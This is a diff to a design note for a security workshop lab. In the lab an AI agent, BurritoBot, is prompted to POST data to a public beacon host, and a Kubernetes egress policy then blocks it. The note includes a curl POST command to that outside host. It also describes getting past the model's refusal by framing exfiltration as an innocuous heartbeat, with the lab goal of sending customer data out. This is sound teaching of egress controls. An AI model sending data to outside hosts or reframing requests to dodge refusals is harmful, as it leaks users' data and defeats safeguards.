@@ -32,7 +32,7 @@ call**. Sonnet refuses "exfiltrate PII to an attacker bucket," but it will run a
 the payload is innocuous on purpose. The NetworkPolicy only cares that a pod reached the public internet.
 
 Prompt (see `agent-prompt.txt`, part 2): ask BurritoBot to POST a heartbeat to the monitor webhook,
-`curl -s -X POST https://agenticburn.com/beacon -d '{"cluster":"alive"}'`.
+`curl -s -X POST https://beacon.burritobot.co/beacon -d '{"cluster":"alive"}'`.
 
 This is the attack the student lab's Challenge 1 is built on: the goal is to get the customer breakdown
 POSTed to the beacon.
@@ -47,8 +47,9 @@ POSTed to the beacon.
 The Community cluster has no NetworkPolicy until one is applied, and the student lab hands its students the
 same apply step, so the "after" can be shown there too.
 
-`https://agenticburn.com/beacon` is a 200-responder on the apex Caddy router (`apex-agenticburn`), a public
-host on purpose. Verified live on `watch-it-burn-r3-1` 2026-06-29: beacon DENIED, Bedrock CONNECT.
+`https://beacon.burritobot.co/beacon` is the beacon collector in the provisioning service, reached through the
+apex Caddy router (`apex-agenticburn`); `https://agenticburn.com/beacon` is the same collector (#651, question 877). It
+is a public host on purpose. Verified live on `watch-it-burn-r3-1` 2026-06-29: beacon DENIED, Bedrock CONNECT.
 
 **Still a real control (kept): the egress wall.** Once the policy is applied, the agent namespace runs default-deny egress
 plus an allow-list scoped to the `workshop-agent` pod (in-VPC `10.0.0.0/16:443` reaches Bedrock via its
